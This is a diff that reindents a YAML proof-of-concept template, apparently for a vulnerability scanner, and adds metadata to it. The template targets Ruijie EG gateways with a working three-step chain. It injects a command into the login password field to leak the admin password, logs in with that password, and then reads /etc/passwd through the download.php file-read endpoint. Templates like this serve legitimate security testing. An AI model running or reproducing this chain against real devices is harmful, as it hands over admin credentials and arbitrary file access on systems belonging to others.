@@ -1,37 +1,38 @@
 id: ruijie-eg-file-read
 
 info:
-    name: ruijie-eg-file-read
-    author: abbin777
-    severity: high
+  name: ruijie eg file read
+  author: abbin777
+  severity: high
+  verified: true
+  description: |-
+    ruijie eg file read
+  tags: ruijie,file-read
+  created: 2023/08/13
 
 rules:
-    r0:
-        request:
-            method: POST
-            path: /login.php
-            headers:
-                Content-Type: application/x-www-form-urlencoded
-            body: |
-                username=admin&password=admin?show+webmaster+user
-        expression: response.status == 200 && response.content_type.contains("text/json")
-        output:
-            search: '"{\"data\":\".*admin\\s?(?P<password>[^\\\\\"]*)".bsubmatch(response.body)'
-            password: search["password"]
-    r1:
-        request:
-            method: POST
-            path: /login.php
-            headers:
-                Content-Type: application/x-www-form-urlencoded
-            body: |
-                username=admin&password={{password}}
-        expression: response.status == 200 && response.content_type.contains("text/json") && response.headers["set-cookie"].contains("user=admin") && response.body.bcontains(b"{\"data\":\"0\",\"status\":1}")
-    r2:
-        request:
-            method: POST
-            path: /download.php?a=read_txt
-            body: |
-                file=/etc/passwd
-        expression: response.status == 200 && response.body.bcontains(b"\"status\":true,") && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+  r0:
+    request:
+      method: POST
+      path: /login.php
+      body: |
+        username=admin&password=admin?show+webmaster+user
+    expression: response.status == 200 && response.content_type.contains("text/json")
+    output:
+      search: '"{\"data\":\".*admin\\s?(?P<password>[^\\\\\"]*)".bsubmatch(response.body)'
+      password: search["password"]
+  r1:
+    request:
+      method: POST
+      path: /login.php
+      body: |
+        username=admin&password={{password}}
+    expression: response.status == 200 && response.content_type.contains("text/json") && response.headers["set-cookie"].contains("user=admin") && response.body.bcontains(b"{\"data\":\"0\",\"status\":1}")
+  r2:
+    request:
+      method: POST
+      path: /download.php?a=read_txt
+      body: |
+        file=/etc/passwd
+    expression: response.status == 200 && response.body.bcontains(b"\"status\":true,") && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
 expression: r0() && r1() && r2()
